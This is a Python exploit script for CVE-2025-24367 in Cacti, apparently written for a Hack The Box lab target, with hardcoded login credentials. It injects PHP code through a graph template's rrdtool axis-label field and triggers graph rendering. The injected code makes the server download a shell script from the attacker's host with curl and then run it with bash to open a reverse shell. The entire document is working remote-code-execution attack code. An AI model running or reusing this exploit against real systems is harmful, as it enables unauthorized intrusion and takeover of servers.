#!/usr/bin/env python3
"""Manual CVE-2025-24367 exploit using Apache on port 80"""
import requests
import re
import random
import string
import time

SESSION = requests.Session()
URL = "http://cacti.monitorsfour.htb"
LHOST = "10.10.16.10"
LPORT = "4455"

def get_csrf(text):
    match = re.search(r'var csrfMagicToken\s*=\s*"(sid:[a-z0-9]+,[a-z0-9]+)', text)
    return match.group(1) if match else None

def login():
    res = SESSION.get(f"{URL}/cacti/index.php")
    csrf = get_csrf(res.text)
    data = {
        '__csrf_magic': csrf,
        'action': 'login',
        'login_username': 'marcus',
        'login_password': 'wonderful1'
    }
    res = SESSION.post(f"{URL}/cacti/index.php", data=data)
    if 'logout' in res.text.lower() or 'logged' in res.text:
        print("[+] Login successful")
        return True
    print("[-] Login failed")
    return False

def inject_payload(stage, filename):
    res = SESSION.get(f"{URL}/cacti/graph_templates.php?action=template_edit&id=226")
    csrf = get_csrf(res.text)

    if stage == 1:
        # Download shell script from Apache
        rrdtool = f"""XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph {filename} -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`curl\\x20{LHOST}/bash\\x20-o\\x20/tmp/shell.sh`;?>
"""
    else:
        # Execute shell script
        rrdtool = f"""XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph {filename} -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`bash\\x20/tmp/shell.sh`;?>
"""

    data = {
        "__csrf_magic": csrf,
        "name": "Unix - Logged in Users",
        "graph_template_id": "226",
        "graph_template_graph_id": "226",
        "save_component_template": "1",
        "title": "|host_description| - Logged in Users",
        "vertical_label": "percent",
        "image_format_id": "3",
        "height": "200",
        "width": "700",
        "base_value": "1000",
        "slope_mode": "on",
        "auto_scale": "on",
        "auto_scale_opts": "2",
        "auto_scale_rigid": "on",
        "upper_limit": "100",
        "lower_limit": "0",
        "unit_value": "",
        "unit_exponent_value": "",
        "unit_length": "",
        "right_axis": "",
        "right_axis_label": rrdtool,
        "right_axis_format": "0",
        "right_axis_formatter": "0",
        "left_axis_formatter": "0",
        "auto_padding": "on",
        "tab_width": "30",
        "legend_position": "0",
        "legend_direction": "0",
        "rrdtool_version": "1.7.2",
        "action": "save"
    }

    SESSION.post(f"{URL}/cacti/graph_templates.php?header=false", data=data)
    print(f"[+] Stage {stage} payload injected")

def trigger():
    SESSION.get(f"{URL}/cacti/graph_json.php?rra_id=0&local_graph_id=3&graph_start=1761683272&graph_end=1761769672&graph_height=200&graph_width=700")
    print("[+] Triggered graph generation")

def access_payload(filename):
    try:
        res = SESSION.get(f"{URL}/cacti/{filename}", timeout=5)
        if res.status_code == 200:
            print(f"[+] Accessed {filename}")
            return True
    except requests.Timeout:
        print(f"[+] Timeout on {filename} - shell likely triggered!")
        return True
    print(f"[-] Failed to access {filename}")
    return False

if __name__ == "__main__":
    if not login():
        exit(1)

    # Stage 1: Download payload
    file1 = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".php"
    inject_payload(1, file1)
    time.sleep(1)
    trigger()
    time.sleep(1)
    access_payload(file1)
    time.sleep(2)

    # Stage 2: Execute payload
    file2 = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".php"
    inject_payload(2, file2)
    time.sleep(1)
    trigger()
    time.sleep(1)
    access_payload(file2)

    print("\n[*] Check your listener!")
